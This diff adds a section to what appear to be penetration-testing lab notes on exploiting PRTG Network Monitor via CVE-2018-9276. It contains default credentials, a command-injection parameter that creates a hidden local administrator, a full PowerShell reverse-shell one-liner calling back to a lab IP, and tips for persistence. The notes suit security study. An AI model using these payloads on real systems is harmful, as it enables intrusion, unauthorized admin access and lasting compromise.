@@ -1582,3 +1582,108 @@ nt authority\system
 
 ---
 
+# PRTG Network Monitor
+
+## 🔎 What is PRTG?
+
+* Agentless network monitoring software by **Paessler**, released in 2003.
+* Supports bandwidth, uptime, and device stats monitoring.
+* Communicates via **ICMP, SNMP, WMI, NetFlow**, and **REST API**.
+* Accessed via a web interface (AJAX) or desktop app (Windows/Linux/macOS).
+* Used by over **300,000 users** worldwide.
+
+## 🔍 Discovery & Enumeration
+
+### 🔎 Nmap Scan Example
+
+```bash
+sudo nmap -sV -p- --open -T4 10.129.201.50
+```
+
+* PRTG service found on port `8080`:
+
+  ```
+  8080/tcp open http Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
+  ```
+
+### 🔐 Default Credentials
+
+* **Default login** often works: `prtgadmin:prtgadmin`
+* In our case: `prtgadmin:Password123`
+
+### 🖥 Version Detection
+
+```bash
+curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version
+```
+
+* Detected: `PRTG Network Monitor 17.3.33.2830`
+
+## ⚠️ Vulnerability: CVE-2018-9276
+
+* **Authenticated Command Injection** in PRTG versions < 18.2.39.
+* Exploited via the **"Execute Program"** notification feature.
+* Payloads passed to PowerShell scripts without sanitization.
+
+## 🧪 Exploiting Command Injection
+
+### 🔧 Steps to Exploit
+
+1. Log in to the web console.
+2. Navigate to:
+
+   ```
+   Setup > Account Settings > Notifications
+   ```
+3. Click **Add new notification**.
+4. Fill out:
+
+   * Name: `pwn`
+   * Enable **Execute Program**
+   * Program File: `Demo exe notification - outfile.ps1`
+   * **Parameter**:
+
+     ```bash
+     test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
+     ```
+5. Save and return to Notifications list.
+6. Click **Test** to run the notification.
+
+> ✅ Creates a new local admin user silently.
+
+## 🧾 Post-Exploitation: Verify Admin Access
+
+### ✅ Confirm Local Admin with CrackMapExec
+
+```bash
+sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
+```
+
+* Output should confirm local admin rights.
+
+### 🛠 Alternative Access Methods
+
+* **RDP**, **WinRM** (evil-winrm), or **Impacket** tools:
+
+  * `wmiexec.py`, `psexec.py`, `smbexec.py`, etc.
+
+## 💡 Optional: Reverse Shell via Injected Command
+
+Example payload for **reverse shell** in parameter field:
+
+```bash
+test.txt; powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+Then start listener:
+
+```bash
+sudo nc -lnvp 443
+```
+
+## 🔁 Persistence Tips
+
+* Set a **schedule** for the notification to run periodically.
+* Useful for re-establishing access during long-term engagements.
+
+---
